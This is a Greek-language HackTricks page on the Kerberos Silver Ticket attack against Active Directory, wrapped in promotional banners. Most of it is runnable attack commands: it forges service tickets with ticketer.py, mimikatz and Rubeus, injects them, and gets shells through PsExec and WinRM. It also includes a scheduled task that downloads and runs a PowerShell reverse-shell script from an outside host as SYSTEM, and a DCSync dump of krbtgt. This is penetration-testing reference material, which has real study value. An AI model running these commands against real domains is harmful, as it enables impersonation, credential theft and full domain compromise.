# Ασημένιο Εισιτήριο

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Ειδικός Red Team του HackTricks στο AWS)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Συμβουλή για bug bounty**: **Εγγραφείτε** στο **Intigriti**, μια πρεμιέρα **πλατφόρμα bug bounty δημιουργημένη από χάκερς, για χάκερς**! Γίνετε μέλος μας στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα και αρχίστε να κερδίζετε αμοιβές έως και **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Ασημένιο Εισιτήριο

Η επίθεση **Ασημένιο Εισιτήριο** περιλαμβάνει την εκμετάλλευση των εισιτηρίων υπηρεσιών σε περιβάλλοντα Active Directory (AD). Αυτή η μέθοδος βασίζεται στο **απόκτηση του NTLM hash ενός λογαριασμού υπηρεσίας**, όπως ενός λογαριασμού υπολογιστή, για να πλασαριστεί ένα εισιτήριο Υπηρεσίας Χορήγησης Εισιτηρίων (TGS). Με αυτό το πλαστό εισιτήριο, ένας εισβολέας μπορεί να έχει πρόσβαση σε συγκεκριμένες υπηρεσίες στο δίκτυο, **παριστάνοντας οποιονδήποτε χρήστη**, με στόχο συνήθως την απόκτηση διαχειριστικών δικαιωμάτων. Επισημαίνεται ότι η χρήση κλειδιών AES για την πλαστογράφηση εισιτηρίων είναι πιο ασφαλής και λιγότερο ανιχνεύσιμη.

Για τη δημιουργία εισιτηρίων, χρησιμοποιούνται διαφορετικά εργαλεία ανάλογα με το λειτουργικό σύστημα:

### Σε Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Στα Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
## Διαθέσιμες Υπηρεσίες

| Τύπος Υπηρεσίας                           | Εισιτήρια Silver για την Υπηρεσία                                                     |
| ------------------------------------------ | -------------------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                                |
| Απομακρυσμένη Εντολή PowerShell         | <p>HOST</p><p>HTTP</p><p>Ανάλογα με το OS επίσης:</p><p>WSMAN</p><p>RPCSS</p>       |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Σε κάποιες περιπτώσεις μπορείτε απλά να ζητήσετε: WINRM</p> |
| Προγραμματισμένες Εργασίες              | HOST                                                                                   |
| Κοινόχρηστος Φάκελος Windows, επίσης psexec | CIFS                                                                                 |
| Λειτουργίες LDAP, περιλαμβάνεται το DCSync | LDAP                                                                                 |
| Εργαλεία Διαχείρισης Απομακρυσμένου Διακομιστή Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                                   |
| Golden Tickets                             | krbtgt                                                                               |

Χρησιμοποιώντας το **Rubeus** μπορείτε να **ζητήσετε όλα** αυτά τα εισιτήρια χρησιμοποιώντας την παράμετρο:

* `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Συμβάντα ID Silver tickets

* 4624: Είσοδος Λογαριασμού
* 4634: Αποσύνδεση Λογαριασμού
* 4672: Είσοδος Διαχειριστή

## Κατάχρηση Εισιτηρίων Υπηρεσιών

Στα παρακάτω παραδείγματα ας υποθέσουμε ότι το εισιτήριο ανακτήθηκε παριστάνοντας τον λογαριασμό διαχειριστή.

### CIFS

Με αυτό το εισιτήριο θα μπορείτε να έχετε πρόσβαση στους φακέλους `C$` και `ADMIN$` μέσω **SMB** (αν είναι εκτεθειμένοι) και να αντιγράψετε αρχεία σε ένα τμήμα του απομακρυσμένου συστήματος αρχείων απλά κάνοντας κάτι σαν:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
### ΚΕΝΤΡΙΚΟΣ ΥΠΟΛΟΓΙΣΤΗΣ

Με αυτήν την άδεια μπορείτε να δημιουργήσετε προγραμματισμένες εργασίες σε απομακρυσμένους υπολογιστές και να εκτελέσετε αυθαίρετες εντολές:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Με αυτά τα εισιτήρια μπορείτε **να εκτελέσετε το WMI στο σύστημα θύματος**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Βρείτε **περισσότερες πληροφορίες σχετικά με το wmiexec** στην ακόλουθη σελίδα:

{% content-ref url="../ntlm/wmicexec.md" %}
[wmicexec.md](../ntlm/wmicexec.md)
{% endcontent-ref %}

### HOST + WSMAN (WINRM)

Με πρόσβαση winrm σε έναν υπολογιστή μπορείτε **να έχετε πρόσβαση** και ακόμη να λάβετε ένα PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Ελέγξτε την ακόλουθη σελίδα για να μάθετε **περισσότερους τρόπους σύνδεσης με έναν απομακρυσμένο κόμβο χρησιμοποιώντας το winrm**:

{% content-ref url="../ntlm/winrm.md" %}
[winrm.md](../ntlm/winrm.md)
{% endcontent-ref %}

{% hint style="warning" %}
Σημειώστε ότι το **winrm πρέπει να είναι ενεργό και να ακούει** στον απομακρυσμένο υπολογιστή για να έχετε πρόσβαση σε αυτόν.
{% endhint %}

### LDAP

Με αυτό το προνόμιο μπορείτε να αδειάσετε τη βάση δεδομένων DC χρησιμοποιώντας το **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Μάθετε περισσότερα σχετικά με το DCSync** στην ακόλουθη σελίδα:

## Αναφορές

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{% content-ref url="dcsync.md" %}
[dcsync.md](dcsync.md)
{% endcontent-ref %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Συμβουλή για bug bounty**: **Εγγραφείτε** στο **Intigriti**, μια προηγμένη **πλατφόρμα bug bounty δημιουργημένη από χάκερς, για χάκερς**! Γίνετε μέλος στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα, και αρχίστε να κερδίζετε αμοιβές έως **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Μάθετε το hacking στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα hacking tricks σας υποβάλλοντας PRs** στα αποθετήρια του **HackTricks**](https://github.com/carlospolop/hacktricks) και του [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
